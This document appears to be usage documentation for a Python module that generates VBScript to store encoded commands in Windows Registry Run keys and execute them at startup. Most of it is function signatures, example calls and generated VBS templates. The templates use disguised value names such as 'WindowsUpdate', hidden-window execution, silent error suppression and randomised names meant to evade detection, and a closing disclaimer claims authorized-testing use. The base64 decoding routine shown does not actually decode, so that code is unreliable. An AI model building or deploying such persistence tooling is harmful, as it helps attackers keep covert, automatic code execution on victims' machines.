# Registry Storage Implementation Guide

## Overview

The registry storage functionality in `vbs_encoder.py` provides comprehensive support for storing and retrieving payloads in Windows Registry. This implementation includes:

- **Registry Writers**: Store encoded payloads in HKLM or HKCU
- **Registry Retrievers**: Read and optionally execute payloads from registry
- **Persistence Mechanisms**: Store payloads for automatic execution on system startup
- **Encoding Support**: Base64 and Hex encoding for obfuscation
- **Validation Functions**: Verify registry paths and hives

## Key Functions

### 1. Registry Storage Functions

#### `VBSEncoder.create_registry_storage_vbs()`
Store a payload in Windows Registry.

```python
def create_registry_storage_vbs(
    self,
    payload: str,
    registry_hive: str = "HKCU",
    registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name: str = "SystemUpdate",
    encoding: str = "base64"
) -> str
```

**Parameters:**
- `payload`: Command or payload to store
- `registry_hive`: "HKCU" or "HKLM"
- `registry_path`: Path within registry hive
- `value_name`: Registry value name
- `encoding`: "base64" or "hex"

**Example:**
```python
from vbs_encoder import VBSEncoder

encoder = VBSEncoder()
vbs_code = encoder.create_registry_storage_vbs(
    "powershell.exe -Command 'Write-Host Test'",
    registry_hive="HKCU",
    registry_path="Software\\Microsoft\\Windows",
    value_name="SystemUpdate",
    encoding="base64"
)
```

### 2. Registry Retrieval Functions

#### `VBSEncoder.create_registry_retrieval_and_execute_vbs()`
Retrieve payload from registry and optionally execute it.

```python
def create_registry_retrieval_and_execute_vbs(
    self,
    registry_hive: str = "HKCU",
    registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name: str = "SystemUpdate",
    encoding: str = "base64",
    auto_execute: bool = True
) -> str
```

**Parameters:**
- `registry_hive`: "HKCU" or "HKLM"
- `registry_path`: Registry path to retrieve from
- `value_name`: Registry value name
- `encoding`: "base64" or "hex"
- `auto_execute`: Whether to execute the retrieved payload

**Example:**
```python
vbs_retrieval = encoder.create_registry_retrieval_and_execute_vbs(
    registry_hive="HKCU",
    registry_path="Software\\Test",
    value_name="MyPayload",
    encoding="base64",
    auto_execute=True
)
```

### 3. Persistence Payload Functions

#### `VBSEncoder.create_registry_persistence_payload()`
Create a complete payload that stores itself and retrieves for execution.

```python
def create_registry_persistence_payload(
    self,
    payload: str,
    registry_hive: str = "HKCU",
    registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name: str = "SystemUpdate",
    encoding: str = "base64"
) -> str
```

**Example:**
```python
persistence_payload = encoder.create_registry_persistence_payload(
    "malicious_command.exe",
    registry_hive="HKCU",
    registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name="SystemService",
    encoding="base64"
)
```

### 4. Utility Functions

#### `write_payload_to_registry()`
Wrapper function for quick payload storage.

```python
def write_payload_to_registry(
    payload: str,
    registry_hive: str = "HKCU",
    registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name: str = "SystemUpdate",
    encoding: str = "base64",
    retrieve_and_execute: bool = False
) -> str
```

#### `create_registry_retriever()`
Wrapper function for quick registry retrieval.

```python
def create_registry_retriever(
    registry_hive: str = "HKCU",
    registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name: str = "SystemUpdate",
    encoding: str = "base64",
    auto_execute: bool = True
) -> str
```

#### `validate_registry_path()`
Validate registry path format.

```python
def validate_registry_path(registry_path: str) -> bool
```

#### `validate_registry_hive()`
Validate registry hive name.

```python
def validate_registry_hive(registry_hive: str) -> bool
```

## Usage Examples

### Example 1: Store Payload in HKCU

```python
from vbs_encoder import write_payload_to_registry

# Store command in HKCU
vbs_code = write_payload_to_registry(
    payload="cmd.exe /c echo HelloWorld",
    registry_hive="HKCU",
    registry_path="Software\\Microsoft\\Windows\\CurrentVersion",
    value_name="UpdateKey",
    encoding="base64"
)

# Save to file
with open("store_payload.vbs", "w") as f:
    f.write(vbs_code)
```

### Example 2: Store and Retrieve with Execution

```python
# Store payload and create retrieval code with auto-execution
vbs_code = write_payload_to_registry(
    payload="powershell.exe -NoProfile -Command \"Write-Host 'Executed'\"",
    registry_hive="HKCU",
    registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name="SystemMaintenance",
    encoding="hex",
    retrieve_and_execute=True
)

# This generates combined storage and retrieval code
```

### Example 3: Retrieve Without Execution

```python
from vbs_encoder import create_registry_retriever

# Just read the payload without executing
vbs_code = create_registry_retriever(
    registry_hive="HKCU",
    registry_path="Software\\MyApp",
    value_name="Config",
    encoding="base64",
    auto_execute=False
)
```

### Example 4: Persistence in Run Key

```python
encoder = VBSEncoder()

# Store in HKLM Run key (requires admin, runs on startup)
vbs_code = encoder.create_registry_persistence_payload(
    payload="C:\\Windows\\System32\\cmd.exe",
    registry_hive="HKLM",
    registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name="WindowsUpdate",
    encoding="base64"
)
```

### Example 5: Validate Registry Paths

```python
from vbs_encoder import validate_registry_path, validate_registry_hive

# Validate paths before use
path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
hive = "HKCU"

if validate_registry_path(path) and validate_registry_hive(hive):
    print("Registry configuration is valid")
else:
    print("Invalid registry configuration")
```

## Registry Hives

### HKCU (HKEY_CURRENT_USER)
- **Scope**: Current user only
- **Permissions**: No admin required
- **Persistence**: Per-user basis
- **Common Paths**:
  - `Software\\Microsoft\\Windows\\CurrentVersion\\Run`
  - `Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`
  - `Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System`

### HKLM (HKEY_LOCAL_MACHINE)
- **Scope**: System-wide
- **Permissions**: Admin required (may fail silently)
- **Persistence**: System-wide
- **Common Paths**:
  - `Software\\Microsoft\\Windows\\CurrentVersion\\Run`
  - `Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`
  - `System\\CurrentControlSet\\Services`

## Encoding Methods

### Base64 Encoding
- Uses MSXML2.DOMDocument for decoding
- More reliable across Windows versions
- Better for multi-line payloads

```python
encoder.create_registry_storage_vbs(
    "powershell command",
    encoding="base64"
)
```

### Hex Encoding
- Uses Chr(CLng("&H...")) conversion
- Slightly more obfuscated
- Better for short commands

```python
encoder.create_registry_storage_vbs(
    "cmd /c echo test",
    encoding="hex"
)
```

## Generated VBS Structure

### Storage Code
```vbs
Dim shell_, regPath_, regVal_, hive_, fullPath_
Set shell_ = CreateObject("WScript.Shell")
hive_ = "HKEY_CURRENT_USER"
regPath_ = "Software\Test"
regVal_ = "Value"
fullPath_ = hive_ & "\" & regPath_ & "\" & regVal_

On Error Resume Next
shell_.RegWrite fullPath_, "encoded_payload", "REG_SZ"
On Error GoTo 0

Set shell_ = Nothing
```

### Retrieval Code
```vbs
Function DecodeB64_(encoded)
    Dim xmlDoc
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    xmlDoc.LoadXML "<root><![CDATA[" & encoded & "]]></root>"
    DecodeB64_ = xmlDoc.DocumentElement.text
    Set xmlDoc = Nothing
End Function

Dim shell_, regPath_, regVal_, hive_, fullPath_
Dim encPayload_, decoded_

Set shell_ = CreateObject("WScript.Shell")
hive_ = "HKEY_CURRENT_USER"
regPath_ = "Software\Test"
regVal_ = "Value"
fullPath_ = hive_ & "\" & regPath_ & "\" & regVal_

On Error Resume Next
encPayload_ = shell_.RegRead(fullPath_)
On Error GoTo 0

If Len(encPayload_) > 0 Then
    decoded_ = DecodeB64_(encPayload_)
    Dim exec_
    Set exec_ = CreateObject("WScript.Shell")
    exec_.Run decoded_, 0, False
    Set exec_ = Nothing
End If

Set shell_ = Nothing
```

## Security Considerations

1. **Admin Privileges**: HKLM writes may fail without admin rights
2. **Registry Permissions**: Some paths require specific permissions
3. **Error Handling**: Code includes `On Error Resume Next` to handle failures gracefully
4. **Encoding**: Both base64 and hex encoding are reversible - don't rely on them for security
5. **Obfuscation**: Variable names are randomized to avoid pattern detection
6. **Payload Limits**: Registry REG_SZ values can store up to 32,767 characters

## Testing

Run the test suite to verify functionality:

```bash
python3 -m unittest test_registry_storage -v
```

Tests cover:
- Storage in HKCU and HKLM
- Retrieval with and without execution
- Base64 and Hex encoding
- Persistence payload generation
- Path and hive validation
- Long payload handling
- Error handling

## Common Registry Persistence Locations

### Startup Locations (User)
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

### Startup Locations (System)
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

### Alternative Locations
```
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System
```

## Troubleshooting

### Registry Write Fails
- Check if admin privileges are required for the target hive
- Verify registry path exists
- Ensure proper backslash escaping in paths

### Registry Read Returns Empty
- Verify the value actually exists in the registry
- Check registry path and value name spelling
- Ensure proper encoding method matches storage

### Payload Not Executing
- Verify `auto_execute=True` in retrieval function
- Check that WScript.Shell.Run is properly formatted
- Ensure command is correctly encoded/decoded

## Integration with Other Functions

The registry storage functions integrate seamlessly with other vbs_encoder functions:

```python
# Generate obfuscated command first
obfuscated = generate_clean_vbs_payload("malicious.exe", "high")

# Then store in registry
vbs_code = write_payload_to_registry(
    payload=obfuscated,
    registry_hive="HKCU",
    encoding="base64"
)
```

## Legal and Ethical Considerations

This implementation is provided for:
- Authorized penetration testing
- Security research
- Educational purposes
- Defensive security measures

Unauthorized access to computer systems is illegal. Use responsibly and legally.
